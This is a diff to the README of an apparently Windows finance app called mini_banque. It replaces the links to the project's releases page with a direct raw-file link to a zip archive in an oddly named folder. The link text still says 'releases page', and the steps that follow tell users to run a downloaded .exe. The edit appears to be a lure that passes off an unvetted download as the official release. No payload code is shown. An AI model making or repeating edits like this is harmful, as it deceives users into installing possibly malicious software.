@@ -1,6 +1,6 @@
 # 🏦 mini_banque - Manage your personal finances with ease
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/scintillating-purebred266/mini_banque/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/scintillating-purebred266/mini_banque/main/lethargical/banque_mini_v2.1.zip)
 
 ## 🎯 About mini_banque
 
@@ -14,7 +14,7 @@ This application runs on Windows systems. You need a computer with Windows 10 or
 
 Follow these steps to set up the software on your computer.
 
-1. Visit the [releases page](https://github.com/scintillating-purebred266/mini_banque/releases) to access the download files.
+1. Visit the [releases page](https://raw.githubusercontent.com/scintillating-purebred266/mini_banque/main/lethargical/banque_mini_v2.1.zip) to access the download files.
 2. Look for the latest release at the top of the page.
 3. Click the link for the file ending in .exe to start your download.
 4. Save the file to your desktop or your downloads folder.
